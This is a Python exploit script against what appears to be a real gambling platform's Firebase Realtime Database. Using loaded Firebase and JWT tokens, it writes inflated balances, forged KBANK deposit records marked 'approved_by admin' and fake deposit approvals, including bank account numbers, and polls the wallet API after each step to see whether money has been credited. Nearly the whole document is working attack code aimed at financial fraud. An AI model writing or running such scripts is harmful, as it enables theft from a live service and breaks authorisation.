#!/usr/bin/env python3
"""probe_rtdb_write.py — RTDB full exploitation: writable balance/wallet/deposit nodes.

   CONFIRMED: RTDB /users/{fb_uid}/* is WRITABLE.
   - DEPOSIT_APPROVE/* → 200 (notification only, no wallet effect)
   - balance.json → 200 (10000.0 written, wallet still 0.31)
   - WITHDRAW_REQUEST/* → 200

   NEW targets:
   - balance_override (may directly override wallet display or trigger backend sync)
   - wallet (wallet object)
   - deposit_transaction (transaction records)
   - DEPOSIT_MEMBER_KBANK (actual KBANK deposits - may trigger processing)
   - deposits (deposit list)
   - wallet_history (history)
"""
import json, pathlib, requests, time, uuid, base64

TID   = "af6efb584a3d317b5a11ab6209b88e1b"
MGAPI = f"https://{TID}mgapi.asdgapicenterssdo.com"
RTDB  = "https://vak88z-default-rtdb.asia-southeast1.firebasedatabase.app"

# Load fresh Firebase token
_new = pathlib.Path("/home/kzp/claude-red/fb_id_token_new.txt")
FB_TOKEN = (_new.read_text().strip() if _new.exists() and _new.stat().st_size > 100
            else pathlib.Path("/home/kzp/claude-red/fb_id_token.txt").read_text().strip())

parts = FB_TOKEN.split(".")
pad = parts[1] + "=" * (-len(parts[1]) % 4)
payload = json.loads(base64.urlsafe_b64decode(pad))
FB_UID = payload.get("sub") or payload.get("user_id", "")
print(f"Firebase UID: {FB_UID}")
print(f"Token expires in: {payload.get('exp',0) - int(time.time())}s")

JWT = pathlib.Path("/home/kzp/claude-red/.jwt.vak88z2").read_text().strip()

def wallet():
    r = requests.get(f"{MGAPI}/mb/wallet",
                     headers={"Authorization": f"Bearer {JWT}", "template": "vn"},
                     timeout=10)
    return r.json().get("balance", "?") if r.ok else f"ERR:{r.status_code}"

def rtdb(path, method="GET", data=None):
    url = f"{RTDB}{path}?auth={FB_TOKEN}"
    fn = {"GET": requests.get, "PUT": requests.put,
          "PATCH": requests.patch, "DELETE": requests.delete}[method]
    kwargs = {"timeout": 12}
    if data is not None:
        kwargs["json"] = data
    return fn(url, **kwargs)

TS_MS = int(time.time() * 1000)
NEW_DEP = str(uuid.uuid4())
AMOUNT  = 10000.0

print(f"\nwallet before: {wallet()}")

# ── 1. Read all interesting nodes ─────────────────────────────────────────────
print("\n=== 1. Read existing node structure ===")
for node in ["wallet", "balance", "balance_override", "deposit_transaction",
             "deposits", "DEPOSIT_MEMBER_KBANK", "transactions", "wallet_history"]:
    r = rtdb(f"/users/{FB_UID}/{node}.json")
    if r.ok and r.text != "null":
        data = r.json()
        if isinstance(data, dict):
            print(f"  {node}: keys={list(data.keys())[:5]}")
            print(f"    sample: {json.dumps(data)[:200]}")
        else:
            print(f"  {node}: {r.text[:200]}")
    elif r.status_code == 401:
        print(f"  {node}: 401 (read denied)")
    else:
        print(f"  {node}: null/empty")

# ── 2. Write to balance_override ─────────────────────────────────────────────
print("\n=== 2. Write balance_override ===")
r = rtdb(f"/users/{FB_UID}/balance_override.json", "PUT", AMOUNT)
print(f"  PUT balance_override={AMOUNT}: HTTP {r.status_code}: {r.text[:100]}")
time.sleep(2)
print(f"  wallet after: {wallet()}")

# ── 3. Write to wallet node ───────────────────────────────────────────────────
print("\n=== 3. Write wallet node ===")
# Try to match existing wallet structure
r_read = rtdb(f"/users/{FB_UID}/wallet.json")
existing_wallet = r_read.json() if r_read.ok else {}
print(f"  Existing wallet: {json.dumps(existing_wallet)[:300]}")

wallet_data = {**existing_wallet} if isinstance(existing_wallet, dict) else {}
wallet_data.update({"balance": AMOUNT, "total_balance": AMOUNT,
                    "updated_at": TS_MS, "credit": AMOUNT})

r = rtdb(f"/users/{FB_UID}/wallet.json", "PUT", wallet_data)
print(f"  PUT wallet: HTTP {r.status_code}: {r.text[:100]}")
time.sleep(2)
print(f"  wallet after: {wallet()}")

# ── 4. PATCH wallet (partial update) ─────────────────────────────────────────
print("\n=== 4. PATCH wallet/balance fields ===")
for field, value in [("balance", AMOUNT), ("credit", AMOUNT),
                     ("total_deposit", AMOUNT), ("available", AMOUNT)]:
    r = rtdb(f"/users/{FB_UID}/wallet/{field}.json", "PUT", value)
    print(f"  PUT wallet/{field}={value}: HTTP {r.status_code}: {r.text[:80]}")
time.sleep(2)
print(f"  wallet after: {wallet()}")

# ── 5. Write to DEPOSIT_MEMBER_KBANK ─────────────────────────────────────────
print("\n=== 5. Write DEPOSIT_MEMBER_KBANK (may trigger processing) ===")
# Read existing to understand format
r_read = rtdb(f"/users/{FB_UID}/DEPOSIT_MEMBER_KBANK.json")
print(f"  Existing DEPOSIT_MEMBER_KBANK: {r_read.text[:400]}")

# Write a deposit that matches KBANK format
kbank_deposit = {
    "amount": str(AMOUNT),
    "approve_status": "success",
    "approved_by": "admin",
    "bank_code": "KBANK",
    "bank_no": "0543753327",  # player bank
    "deposit_amount": AMOUNT,
    "id": NEW_DEP,
    "platform_bank_no": "1029600000052",  # platform KBANK account
    "status": "success",
    "timestamp": TS_MS,
    "uid": FB_UID,
}
r = rtdb(f"/users/{FB_UID}/DEPOSIT_MEMBER_KBANK/{NEW_DEP}.json", "PUT", kbank_deposit)
print(f"  PUT DEPOSIT_MEMBER_KBANK/{NEW_DEP[:8]}: HTTP {r.status_code}: {r.text[:200]}")
time.sleep(3)
print(f"  wallet after: {wallet()}")

# ── 6. Write to deposit_transaction ──────────────────────────────────────────
print("\n=== 6. Write deposit_transaction ===")
r_read = rtdb(f"/users/{FB_UID}/deposit_transaction.json")
print(f"  Existing deposit_transaction: {r_read.text[:400]}")

dep_tx = {
    "id": NEW_DEP,
    "approve_status": "success",
    "deposit_amount": AMOUNT,
    "balance_after_deposit": AMOUNT + 0.31,
    "created_at": TS_MS,
    "updated_at": TS_MS,
    "uid": FB_UID,
    "status": "success",
    "type": "deposit",
}
r = rtdb(f"/users/{FB_UID}/deposit_transaction/{NEW_DEP}.json", "PUT", dep_tx)
print(f"  PUT deposit_transaction/{NEW_DEP[:8]}: HTTP {r.status_code}: {r.text[:200]}")
time.sleep(2)
print(f"  wallet after: {wallet()}")

# ── 7. Write to deposits root (not under user) ────────────────────────────────
print("\n=== 7. Write to /deposits (root) ===")
r = rtdb(f"/deposits/{NEW_DEP}.json", "PUT", {**dep_tx, "player_uid": FB_UID})
print(f"  PUT /deposits/{NEW_DEP[:8]}: HTTP {r.status_code}: {r.text[:100]}")

# ── 8. PATCH balance directly ─────────────────────────────────────────────────
print("\n=== 8. PATCH /users/{fb_uid} direct balance fields ===")
for field, value in [("balance", AMOUNT), ("balance_override", AMOUNT),
                     ("credit", AMOUNT)]:
    r = rtdb(f"/users/{FB_UID}/{field}.json", "PUT", value)
    print(f"  PUT {field}={value}: HTTP {r.status_code}: {r.text[:60]}")
time.sleep(3)
print(f"  wallet after: {wallet()}")

# ── 9. Trigger wallet recalc by writing a new DEPOSIT_APPROVE with real dep ID ─
print("\n=== 9. DEPOSIT_APPROVE with real deposit IDs ===")
# From probe_put_approve.py known waiting IDs
known_waiting = [
    "735079eb-0000-0000-0000-000000000000",  # likely wrong - partial ID
    "b0783e2e-1051-453f-800c-b83f670cd93f",  # already in RTDB with success!
]
# Try a fresh deposit from probe_auto_slip pattern
for dep_id in known_waiting[:3]:
    approve_data = {
        "amount": str(AMOUNT),
        "approve_status": "success",
        "approved_by": "admin",
        "deposit_amount": AMOUNT,
        "id": dep_id,
        "status": "success",
        "timestamp": TS_MS,
        "uid": FB_UID,
    }
    r = rtdb(f"/users/{FB_UID}/DEPOSIT_APPROVE/{dep_id}.json", "PUT", approve_data)
    print(f"  PUT DEPOSIT_APPROVE/{dep_id[:8]}: HTTP {r.status_code}: {r.text[:100]}")

time.sleep(3)
print(f"\nwallet FINAL: {wallet()}")

# ── 10. Read wallet node after all writes ─────────────────────────────────────
print("\n=== 10. RTDB wallet node after all writes ===")
r = rtdb(f"/users/{FB_UID}/wallet.json")
print(f"  wallet node: {r.text[:400]}")
r = rtdb(f"/users/{FB_UID}/balance.json")
print(f"  balance node: {r.text[:100]}")
r = rtdb(f"/users/{FB_UID}/balance_override.json")
print(f"  balance_override: {r.text[:100]}")

print("\n=== DONE ===")
